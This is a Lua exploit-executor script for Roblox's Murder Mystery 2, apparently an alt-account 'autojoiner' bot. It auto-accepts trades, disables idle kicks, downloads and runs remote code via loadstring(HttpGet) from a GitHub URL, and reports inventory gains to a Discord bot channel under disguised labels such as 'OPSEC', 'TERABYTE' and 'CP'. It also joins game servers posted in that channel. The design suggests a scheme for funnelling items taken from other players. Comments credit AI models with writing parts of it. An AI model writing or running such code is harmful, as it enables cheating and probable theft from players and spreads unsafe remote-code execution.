
repeat task.wait() until game:IsLoaded()
nouse = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
a = tick()
game.ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(nub)
     if nub.LastOffer then 
        lastofer = nub.LastOffer
        while true do 
            if nub.LastOffer ~= lastofer then break end
            game.ReplicatedStorage.Trade.AcceptTrade:FireServer(game.PlaceId * 3, nub.LastOffer)
            task.wait(0.1)
        end 
    end
end) 
task.spawn(function() 
    while game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("DeviceSelect") do
        firesignal(game:GetService("Players").LocalPlayer.PlayerGui.DeviceSelect.Container.Phone.Button.MouseButton1Click)
        task.wait(0.1)
    end
end)
function trads()
    return game.ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
end
function getinv()
    return game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(game.Players.LocalPlayer.Name).Weapons.Owned
end
for _, b in pairs(getconnections(game.Players.LocalPlayer.Idled)) do
    b:Disable(); 
end;
local HttpService = game:GetService("HttpService")
local databrainrot = require(game.ReplicatedStorage.Database.Sync).Weapons
task.spawn(function() urnubitems = getinv() end)
print(1)
local exec,execver = identifyexecutor()
totalval = 0
function ischanged()
    local currentInventory = getinv()
    local changes = {}
    local hasChanged = false
    for item, amount in pairs(currentInventory) do
        local oldAmount = urnubitems[item] or 0
        if amount ~= oldAmount then
            changes[item] = amount - oldAmount
            hasChanged = true
        end
    end
    for item, oldAmount in pairs(urnubitems) do
        if currentInventory[item] == nil then
            changes[item] = -oldAmount
            hasChanged = true
        end
    end
    if hasChanged then
        urnubitems = currentInventory
        return true,changes
    end
    return false
end
function chang(inve)
    local valueList = loadstring(game:HttpGet("https://raw.githubusercontent.com/kroxn/aj/refs/heads/main/vlues.lua"))()
    new = {}
    newval = 0
    for i,v in pairs(inve) do
        table.insert(new,{
            name = i,
            amount = v,
            value = valueList[databrainrot[i].Rarity][databrainrot[i].ItemName] or 0
        })
        newval = newval+(valueList[databrainrot[i].Rarity][databrainrot[i].ItemName] or 0)*v
        totalval = totalval+(valueList[databrainrot[i].Rarity][databrainrot[i].ItemName] or 0)*v
    end
    table.sort(new, function(a, b)
        return (a.value * a.amount) > (b.value * b.amount)
    end)    
    fields = {
        {
            name="OPSEC",
            value="```\n📱 VPN: "..exec.." "..execver.."\n💎 TOTAL TERABYTE: "..newval.."\n💎 DOWNLOADED TERABYTE: "..totalval.."\n```"
        },
        {
            name="NEW MP4",
            value=""
        },
    }
    for i, v in ipairs(new) do
        itemnub = string.format("%s (x%s) → %s Value", v.name, v.amount, (v.value * v.amount))
        fields[2].value = fields[2].value .. itemnub .. "\n"
    end
    fields[2].value = "```\n"..fields[2].value.."\n```"
    local url = "https://discord.com/api/v10/channels/"..logid.."/messages"
    local payload = {
         embeds  = {{
            title  = "CP",
            color  = 0x3EED50,
            fields = fields,
        }}
    }
    local response = request({
        Url = url,
        Method = "POST",
        Headers = {
            ["Authorization"] = "Bot " .. bottoken,
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(payload)
    })
    if response.StatusCode ~= 200 then
        warn(response.Body)
    end
end
tradesd = 0
task.spawn(function()
    while true do
        local status,skot = trads()
        if status == "StartTrade" then
            timeintrade = 0
            repeat 
                timeintrade = timeintrade + task.wait(0.1)
                if timeintrade >= 7 then 
                    game.ReplicatedStorage.Trade.DeclineTrade:FireServer()
                    break
                end 
            until trads() ~= "StartTrade"
            local bolean,itmes = ischanged()
            if bolean == true then
                tradesd = tradesd+1
                chang(itmes)
            end
        elseif status == "ReceivingRequest" then
            game.ReplicatedStorage.Trade.AcceptRequest:FireServer()
        end
        task.wait(0.1)
    end
end)
print(2)

function react(msgid, emoji)
    local url = "https://discord.com/api/v10/channels/"..tostring(chanelid).."/messages/"..tostring(msgid).."/reactions/"..HttpService:UrlEncode(emoji).."/@me"
    local response = request({
        Url = url,
        Method = "PUT",
        Headers = {["Authorization"] = "Bot "..bottoken}
    })
    
    if response.StatusCode ~= 204 then
        warn(response.Body)
    end
end


function inv()
    local valueList = loadstring(game:HttpGet("https://raw.githubusercontent.com/kroxn/aj/refs/heads/main/vlues.lua"))()
    local url = "https://discord.com/api/v10/channels/"..logid.."/messages"
    neww = {}
    newwval = 0
    for i,v in pairs(getinv()) do
        table.insert(neww,{
            name = i,
            amount = v,
            value = valueList[databrainrot[i].Rarity][databrainrot[i].ItemName] or 0
        })
        newwval = newwval+(valueList[databrainrot[i].Rarity][databrainrot[i].ItemName] or 0)
    end
    table.sort(neww, function(a, b)
        return (a.value * a.amount) > (b.value * b.amount)
    end)
    fields = {
        {
            name="OPSEC",
            value="```\n📱 VPN: "..exec.." "..execver.."\n💎 TOTAL TERABYTE: "..newval.."\n💎 DOWNLOADED TERABYTE: "..totalval.."\n```"
        },
        {
            name="MP4",
            value=""
        },
    }
    for i, v in ipairs(neww) do
        itemnub = string.format("%s (x%s) → %s Value", v.name, v.amount, (v.value * v.amount))
        fields[2].value = fields[2].value .. itemnub .. "\n"
    end
    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n")
        end
    end
    fields[2].value = "```\n"..fields[2].value.."\n```"
    local url = "https://discord.com/api/v10/channels/"..logid.."/messages"

    local payload = {
         embeds  = {{
            title  = "MM2 Autojoiner",
            color  = 0x3EED50,
            fields = fields,
        }}

    }

    local response = request({
        Url = url,
        Method = "POST",
        Headers = {
            ["Authorization"] = "Bot " .. bottoken,
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(payload)
    })
    
    if response.StatusCode ~= 200 then
        warn(response.Body)
    end
end
function invf()
    local url = "https://discord.com/api/v10/channels/"..logid.."/messages" 

    
    local valueList = loadstring(game:HttpGet("https://raw.githubusercontent.com/kroxn/aj/refs/heads/main/vlues.lua"))()
    local inventroy = "Inventory value: "
    talbe = {}
    vaule = 0
    for i,v in pairs(getinv()) do
        table.insert(talbe,{
            name = i,
            amount = v,
            value = valueList[databrainrot[i].Rarity][databrainrot[i].ItemName] or 0
        })
        vaule = vaule+(valueList[databrainrot[i].Rarity][databrainrot[i].ItemName] or 0)
    end
    inventroy = inventroy..tostring(vaule).."\n\n"
    table.sort(talbe, function(a, b)
        return (a.value * a.amount) > (b.value * b.amount)
    end)
    for i, v in ipairs(talbe) do
        lnie = string.format("%s (x%s) → %s Value", v.name, v.amount, (v.value * v.amount))
        inventroy = inventroy .. lnie .. "\n"
    end
    --gemini
    local boundary = "---------------------------" .. tick()
    local body = "--" .. boundary .. "\r\n" ..
                "Content-Disposition: form-data; name=\"file\"; filename=\"items.yaml\"\r\n" ..
                "Content-Type: text/plain\r\n\r\n" ..
                inventroy .. "\r\n" ..
                "--" .. boundary .. "--\r\n"
    --
    local response = request({
        Url = url,
        Method = "POST",
        Headers = {
            ["Authorization"] = "Bot " .. bottoken,
            ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
        },
        Body = body
    })

    if response.StatusCode == 200 or response.StatusCode == 201 then else
        warn(response.Body)
    end

end
if not isfile("jnubs.txt") then
	writefile("jnubs.txt", "[]")
end
if not isfile("nub.txt") then
	writefile("nub.txt", "nub")
end
if not isfile("queue.txt") then
	writefile("queue.txt", "[]")
end






-- claude opus code starts here
local function readlist(file)
    local ok, t = pcall(function() return HttpService:JSONDecode(readfile(file)) end)
    if ok and type(t) == "table" then return t end
    return {}
end
local function writelist(file, t)
    pcall(function() writefile(file, HttpService:JSONEncode(t)) end)
end
local function inlist(file, value)
    for _, v in ipairs(readlist(file)) do
        if v == value then return true end
    end
    return false
end
local function addtolist(file, value)
    local t = readlist(file)
    for _, v in ipairs(t) do
        if v == value then return end
    end
    table.insert(t, value)
    writelist(file, t)
end

function playerleft()
    local target = readfile("nub.txt")
    for _,nub in pairs(game.Players:GetChildren()) do
        if nub.Name == target then
            return false
        end
    end
    return true
end
local function readytojoin()
    return tradesd >= tradesbeforenext or playerleft()
end

local TeleportService = game:GetService("TeleportService")
local LocalPlayer = game.Players.LocalPlayer

local teleporting = false
local lastMessageId = nil
local currentTarget = nil   -- {placeId, jobId, msgid} the teleport loop is aiming at

local function fetchMessages(afterId)
    local url = "https://discord.com/api/v10/channels/"..chanelid.."/messages?limit=50"
    if afterId then url = url.."&after="..afterId end
    local ok, response = pcall(function()
        return request({
            Url = url,
            Method = "GET",
            Headers = { ["Authorization"] = "Bot "..bottoken }
        })
    end)
    if ok and response and response.StatusCode == 200 then
        local ok2, decoded = pcall(function() return HttpService:JSONDecode(response.Body) end)
        if ok2 and type(decoded) == "table" then return decoded end
    end
    return {}
end

local function processJoinMessage(messageData)
    if not messageData or not messageData.author then return end
    if messageData.channel_id and messageData.channel_id ~= chanelid then return end

    local content = messageData.content or ""
    -- format 1:  142823291,'ca7a63aa-...'
    local placeId, jobId = string.match(content, "(%d+),%s*'([^']+)'")
    -- format 2:  TeleportToPlaceInstance("142823291", "ca7a63aa-...", ...)
    if not (placeId and jobId) then
        placeId, jobId = string.match(content, 'TeleportToPlaceInstance%s*%(%s*"(%d+)"%s*,%s*"([^"]+)"')
    end
    if not (placeId and jobId) then return end

    task.spawn(function() react(messageData.id,"✅") end)
    writefile("nub.txt", messageData.author.username)

    if inlist("jnubs.txt", messageData.id) then return end
    if jobId == game.JobId then return end

    -- mid-teleport: switch straight to this new server instead of queuing it
    if teleporting then
        teleportTo(placeId, jobId, messageData.id)
        return
    end

    local q = readlist("queue.txt")
    for _, j in ipairs(q) do
        if j.msgid == messageData.id then return end
    end
    table.insert(q, {
        placeId = placeId,
        jobId = jobId,
        msgid = messageData.id,
        author = messageData.author.username
    })
    writelist("queue.txt", q)
end

local function checkMessagesWhileTeleporting()
    while teleporting do
        local msgs = fetchMessages(lastMessageId)
        for i = #msgs, 1, -1 do
            processJoinMessage(msgs[i])
        end
        if msgs[1] then
            lastMessageId = msgs[1].id
        end
        task.wait(1)
    end
end

-- teleport to currentTarget, retrying forever. if a new join message arrives
-- processJoinMessage calls teleportTo again, currentTarget changes, and the loop
-- immediately switches to the new server.
function teleportTo(placeId, jobId, msgid)
    currentTarget = { placeId = tonumber(placeId), jobId = jobId, msgid = msgid }

    if teleporting then return end   -- a loop is already running; it picks up currentTarget
    teleporting = true
    task.spawn(checkMessagesWhileTeleporting)

    task.spawn(function()
        local failed = false
        local conn = TeleportService.TeleportInitFailed:Connect(function(player)
            if player == LocalPlayer then failed = true end
        end)

        while teleporting do
            local target = currentTarget
            failed = false
            local ok = pcall(function()
                TeleportService:TeleportToPlaceInstance(target.placeId, target.jobId, LocalPlayer)
            end)
            if ok and target.msgid then
                addtolist("jnubs.txt", target.msgid)
            end

            -- wait out this attempt; break early if it failed or the target changed
            local t = 0
            while t < 5 and not failed and currentTarget == target do
                task.wait(0.5)
                t = t + 0.5
            end

            -- target unchanged -> space out the retry; changed -> retry immediately
            if currentTarget == target then
                task.wait(2)
            end
        end

        if conn then conn:Disconnect() end
    end)
end
local socket
local sequenceNumber
local sessionId
local resumeUrl
local shouldResume = false
local connectionId = 0
local readyConnId = 0   -- generation that successfully reached READY/RESUMED
local helloConnId = 0   -- generation that received the HELLO (op 10)

function sendPayload(op, d)
    if not socket then return end
    pcall(function()
        socket:Send(HttpService:JSONEncode({
            op = op,
            d = d
        }))
    end)
end

local function connectgateway()
    connectionId = connectionId + 1
    local myId = connectionId
    local url = "wss://gateway.discord.gg/?v=10&encoding=json"
    if shouldResume and resumeUrl then
        url = resumeUrl .. "/?v=10&encoding=json"
    end

    print("[gateway] connecting (gen "..myId..")")
    -- IMPORTANT: call WebSocket.connect directly, exactly like old.lua.
    -- It is a YIELDING call; wrapping it in pcall(function() ... end) makes the
    -- yield cross a pcall/closure boundary, which on many executors returns a
    -- socket that never receives HELLO ("dead socket"). Do not wrap it.
    socket = WebSocket.connect(url)
    socket.OnMessage:Connect(function(msg)
        if connectionId ~= myId then return end
        local data = HttpService:JSONDecode(msg)

        if data.s then
            sequenceNumber = data.s
        end

        if data.op == 10 then
            helloConnId = myId
            local heartbeatInterval = data.d.heartbeat_interval / 1000
            if shouldResume and sessionId and sequenceNumber then
                print("[gateway] HELLO received, sending RESUME")
                sendPayload(6, {
                    token = bottoken,
                    session_id = sessionId,
                    seq = sequenceNumber
                })
            else
                print("[gateway] HELLO received, sending IDENTIFY")
                sendPayload(2, {
                    token = bottoken,
                    intents = 33280,
                    properties = {
                        os = "linux",
                        browser = "opsec",
                        device = "desktop"
                    }
                })
            end
            task.spawn(function()
                while connectionId == myId and socket do
                    task.wait(heartbeatInterval)
                    if connectionId ~= myId then break end
                    sendPayload(1, sequenceNumber)
                end
            end)
        end

        if data.op == 0 and data.t == "READY" then
            sessionId = data.d.session_id
            resumeUrl = data.d.resume_gateway_url
            shouldResume = true
            readyConnId = myId
            print("[gateway] connected (READY)")
        end

        if data.op == 0 and data.t == "RESUMED" then
            readyConnId = myId
            print("[gateway] session resumed")
        end

        if data.op == 7 then
            shouldResume = true
            pcall(function() if socket then socket:Close() end end)
            return
        end

        if data.op == 9 then
            shouldResume = (data.d == true)
            if not shouldResume then
                sessionId = nil
            end
            task.wait(math.random(1, 5))
            pcall(function() if socket then socket:Close() end end)
            return
        end

        if data.op == 0 and data.t == "MESSAGE_CREATE" then
            local messageData = data.d
            if messageData.channel_id == chanelid then
                lastMessageId = messageData.id
                if messageData.content==".inv" then
                    task.spawn(function() react(messageData.id,"✅") end)
                    inv()
                elseif messageData.content==".invf" then
                    task.spawn(function() react(messageData.id,"✅") end)
                    invf()
                end

                processJoinMessage(messageData)
            end
        end
    end)
    if not socket then
        warn("[gateway] connect returned nil, retrying")
        task.wait(5 + math.random() * 5)          -- jitter so alts don't sync up
        if connectionId == myId then connectgateway() end
        return
    end

    print("[gateway] socket open, waiting for handshake")

    socket.OnClose:Connect(function()
        if connectionId ~= myId then return end   -- stale handler, ignore
        warn("[gateway] closed, reconnecting")
        socket = nil
        if sessionId and sequenceNumber then
            shouldResume = true
        end
        task.wait(5 + math.random() * 5)
        if connectionId == myId then connectgateway() end   -- re-check after wait
    end)

    -- watchdog. a socket can open but silently stall:
    --   * no HELLO at all    -> dead socket (gateway TLS never finished). retry FAST.
    --   * HELLO but no READY -> IDENTIFY problem (usually rate limit). back off.
    task.spawn(function()
        -- phase 1: HELLO should arrive within ~1s on a live socket
        task.wait(6)
        if connectionId == myId and helloConnId ~= myId then
            warn("[gateway] no HELLO (dead socket), retrying now")
            pcall(function() if socket then socket:Close() end end)
            if connectionId == myId then
                socket = nil
                connectgateway()        -- no wait: just grab a fresh connection
            end
            return
        end

        -- phase 2: READY should follow HELLO quickly
        if connectionId ~= myId then return end
        task.wait(8)
        if connectionId == myId and readyConnId ~= myId then
            warn("[gateway] HELLO but no READY (rate limited?), backing off")
            pcall(function() if socket then socket:Close() end end)
            task.wait(3 + math.random() * 4)
            if connectionId == myId then
                socket = nil
                connectgateway()
            end
        end
    end)
end

task.spawn(function()
    while true do
        task.wait(1)
        if not teleporting and readytojoin() then
            local q = readlist("queue.txt")
            if #q > 0 then
                local job = table.remove(q, 1)
                writelist("queue.txt", q)
                if job and job.msgid and not inlist("jnubs.txt", job.msgid) and job.jobId ~= game.JobId then
                    teleportTo(job.placeId, job.jobId, job.msgid)
                end
            end
        end
    end
end)

connectgateway()
--
print(tick()-a)
